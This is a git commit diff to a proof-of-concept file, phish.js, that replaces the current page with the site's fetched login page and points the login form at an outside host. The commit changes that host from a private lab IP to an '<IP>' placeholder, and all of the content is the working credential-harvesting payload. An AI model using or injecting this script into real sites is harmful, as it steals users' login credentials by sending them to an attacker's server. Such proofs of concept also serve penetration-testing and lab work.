8f9723be96d7c8e04ed52b4b9e20e1f25bad8873
SquallForger24 <159946529+SquallForger24@users.noreply.github.com>
2024-03-12 13:19:29 -0700

    Update phish.js

--- POCs/phish.js
+++ POCs/phish.js
@@ -1,6 +1,6 @@
 fetch("login").then(res => res.text().then(data => {
         document.getElementsByTagName("html")[0].innerHTML = data
-        document.getElementsByTagName("form")[0].action = "http://192.168.45.206" 
+        document.getElementsByTagName("form")[0].action = "http://<IP>" 
         document.getElementsByTagName("form")[0].method = "get"
 }))
 
